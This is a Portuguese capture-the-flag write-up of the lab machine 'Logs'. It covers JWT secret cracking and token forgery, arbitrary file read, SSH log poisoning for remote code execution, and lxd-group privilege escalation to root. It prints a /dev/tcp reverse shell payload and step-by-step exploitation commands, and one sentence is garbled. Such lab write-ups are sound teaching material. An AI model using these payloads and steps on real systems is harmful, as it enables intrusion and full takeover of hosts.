# Logs

![Logs](/images/hackingclub-logs/file-logs-2026-1.png)

## Sumário

O ponto inicial do comprometimento foi a utilização de uma chave secreta `JWT` fraca, o que possibilitou a forja de tokens de autenticação válidos e, consequentemente, o acesso indevido à `API de production`. A partir desse acesso, foi possível interagir com a `aplicação principal` e explorar uma funcionalidade vulnerável que resultou em `leitura arbitrária de arquivos` no servidor.

Com essa primitiva de leitura de arquivos, identificou-se e explorou-se uma vulnerabilidade de `log poisoning`. O log de autenticação do `SSH` foi envenenado por meio de requisições controladas, e em seguida esse mesmo arquivo de log foi referenciado pela funcionalidade vulnerável, o que permitiu a `execução remota de comandos(RCE)` no servidor.

Após a obtenção da shell remota, foi possível realizar a movimentação lateral no sistema e identificar `credenciais fracas` armazenadas em um banco de dados `SQLite` localizado em um diretório compartilhado. Utilizando essas credenciais, foi feito o login em um novo usuário. Esse usuário, por sua vez, pertencia ao grupo `LXC`, o que permitiu a criação e execução de um contêiner privilegiado. A partir dessa configuração insegura, foi possível montar o sistema de arquivos do host e, assim, obter acesso completo como `root`.

## Enumeração incial do alvo

Utilizamos o nmap para fazer a varredura de quais portas estão abertas no host.

```bash
nmap -sC -sV -Pn logs.hc
```

**Resultado**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
```

### Fuzzing

Durante a fase de enumeração e fuzzing de subdomínios, foi identificado um virtual host adicional (vhost) não documentado. A análise inicial indicou que esse host virtual correspondia a um ambiente de `staging`.

**Comando**

```bash
ffuf -u http://logs.hc -H "Host: FUZZ.logs.hc" -w /path/to/wordlist -mc 200
```

**Resultado**

```
staging [Status: 200, Size: 8061, Words: 2656, Lines: 166, Duration: 155ms]
```

![Fuzzing](/images/hackingclub-logs/file-logs-2026-2.png)

## Aplicação Web

Ao acessar o vhost e autenticar na aplicação, foi identificado um endpoint que expõe a documentação da API utilizada pelo sistema. Durante a análise dessa documentação, a rota `/api/view?file=arquivo` chamou atenção, pois sua funcionalidade consiste em realizar a `leitura de arquivos` no servidor e retornar seu conteúdo diretamente na resposta.

![Documentation API](/images/hackingclub-logs/file-logs-2026-5.png)

Com as credenciais obtidas no vhost, foi possível autenticar na aplicação principal, onde conseguimos visualizar o `token JWT de autenticação`. A partir disso, surgiu a possibilidade de tentar quebrar a secret do JWT via brute force, com o objetivo de forjar um novo token contendo o role de administrador e, assim, acessar a rota privilegiada da API.

![Production Aplication](/images/hackingclub-logs/file-logs-2026-6.png)

No entanto, ao interceptar a requisição via Burp Suite, o servidor retornou uma mensagem informando que a chamada deveria ser realizada no `host de produção`. Para que isso fosse possível, era necessário que o token de autenticação possuísse o `role admin`.

![Burp Request](/images/hackingclub-logs/file-logs-2026-9.png)

### Brute Force

Realizamos um brute force com o módulo do hashcat, a fim de obter a secret do token JWT.

```bash
hashcat -m 16500 TokenJWT.txt /path/to/wordlists
```

**Resultado**

- `92839853879156166491915372959629`

![Hashcat](/images/hackingclub-logs/file-logs-2026-7.png)

Com a chave secreta comprometida, torna-se possível forjar tokens de autenticação, atribuindo o papel de administrador (`role: admin`). Dessa forma, obtemos privilégios elevados, permitindo o acesso à funcionalidade de leitura arbitrária de arquivos no servidor (`file read`).

![Token](/images/hackingclub-logs/file-logs-2026-8.png)

Essa capacidade amplia significativamente a superfície de ataque, pois viabiliza a exploração da vulnerabilidade conhecida como `log poisoning`. Ao envenenar os `logs` do serviço `SSH`, é possível injetar código malicioso, que posteriormente pode ser interpretado pela aplica/var/log/auth.shção, resultando em `execução remota de comandos (RCE)`.

![File Read](/images/hackingclub-logs/file-logs-2026-10.png)
> ⚠️ Lembre-se de que a requisição deve ser feita no host de produção.
{: .prompt-warning}

## Log Poisoning

Com a funcionalidade de leitura arbitrária de arquivos (`file read`), torna-se possível tentar a obtenção de uma shell remota por meio da técnica de `log poisoning`, explorando especificamente os arquivos de log do serviço SSH, localizados em:

```bash
/var/log/auth.log
```

Para viabilizar o envenenamento dos logs do SSH, realizamos tentativas controladas de autenticação, de forma a injetar uma payload maliciosa no campo de usuário, garantindo seu registro no arquivo de log.

Para isso, foi criada uma wordlist contendo no mínimo dois elementos, sendo obrigatório que um deles seja a payload maliciosa apresentada na imagem abaixo. Em seguida, executamos um ataque de `força bruta` utilizando a ferramenta `NetExec`, com o objetivo de provocar falhas de autenticação deliberadas, fazendo com que a payload seja gravada no log.

![NetExec](/images/hackingclub-logs/file-logs-2026-12.png)

Uma vez confirmado o envenenamento do arquivo, sua posterior leitura por meio da vulnerabilidade de file read possibilita a execução remota de comandos (`RCE`), culminando na obtenção de uma shell interativa no servidor alvo.

![Log Poisoning](/images/hackingclub-logs/file-logs-2026-13.png)

![Shell](/images/hackingclub-logs/file-logs-2026-14.png)

**Payload de Shell Reversa**

```
bash -c "sh -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1"
```

> ⚠️ Lembre-se de fazer o url encoded.
{: .prompt-warning}

## Movimentação Lateral

Após obter acesso inicial ao sistema por meio de uma shell reversa, realizamos a enumeração do ambiente com o objetivo de identificar possíveis vetores de escalonamento de privilégios e movimentação lateral. Durante essa etapa, foi localizado o arquivo `database.sqlite` no diretório `/shared`.

Ao analisar o conteúdo do banco de dados e consultar a tabela de usuários, identificamos o hash da senha do usuário `developer`, armazenado utilizando o algoritmo de `hashing bcrypt`. 

![Sqlite](/images/hackingclub-logs/file-logs-2026-15.png)

### Hashcat

Após obter o hash da senha do usuário `developer`, realizamos um ataque de força bruta utilizando o `Hashcat`.

**Resultado**

- `superman`

![Hash](/images/hackingclub-logs/file-logs-2026-16.png)

Após a quebra do hash da senha, realizamos a autenticação no usuário developer por meio do comando `su developer`, obtendo acesso à conta e, consequentemente, a primeira flag.

![Developer](/images/hackingclub-logs/file-logs-2026-17.png)

## Privilege Escalation

Após a autenticação como usuário developer, executamos o comando `id` para verificar grupos e permissões. Conforme observado, o usuário pertence ao grupo `105 (lxd)`.

Essa configuração permite a elevação de privilégios, uma vez que usuários membros do `grupo lxd` podem criar e gerenciar containers com `permissões elevadas`, possibilitando a montagem do sistema de arquivos do host e, consequentemente, a obtenção de `acesso privilegiado` ao `host principal`.

### Referência

- [Lxd Privilege Escalation in Linux | Lxd Group](https://amanisher.medium.com/lxd-privilege-escalation-in-linux-lxd-group-ec7cafe7af63)

1 - Baixe esta imagem de contêiner Alpine Linux do [GitHub](https://github.com/saghul/lxd-alpine-builder).

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
```

2 - Agora compartilhe este arquivo de imagem `alphine-v3.13-x86_64-20210218_0139.tar.gz` com o computador da vítima.

```bash
python3 -m http.server 8080
```

![File](/images/hackingclub-logs/file-logs-2026-18.png)

3 - No computador da vítima, baixe o arquivo de imagem com o comando `curl`.

```bash
curl -O http://IP_ADDRESS:PORT/alphine-v3.13-x86_64-20210218_0139.tar.gz
```

![Curl](/images/hackingclub-logs/file-logs-2026-19.png)

4 - Agora importe este contêiner LXD para o ambiente LXD e atribua um `--alias` a ele.

```bash
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
```

5 - Exibe uma lista de todas as imagens armazenadas no repositório de imagens LXD local.

```bash
lxc image list
```

![ImageAlpine](/images/hackingclub-logs/file-logs-2026-20.png)

6 - Agora execute os seguintes comandos um por um.

```bash
lxc init myimage ignite -c security.privileged= true
lxc config device add ignite mydevice disk source =/ path=/mnt/root recursive= true
lxc start ignite 
lxc exec ignite /bin/sh
```

7 - Navegue até o diretório `/mnt/root` para acessar o sistema de arquivos do host com privilégios de `root`.

```bash
cd /mnt/root
```

![Root](/images/hackingclub-logs/file-logs-2026-21.png)

Agora temos controle total dentro do contêiner.

> ℹ️ Observação: Ser root dentro de um contêiner não significa automaticamente ter acesso root no sistema host, já que os contêineres são projetados para isolar processos.
{: .prompt-info}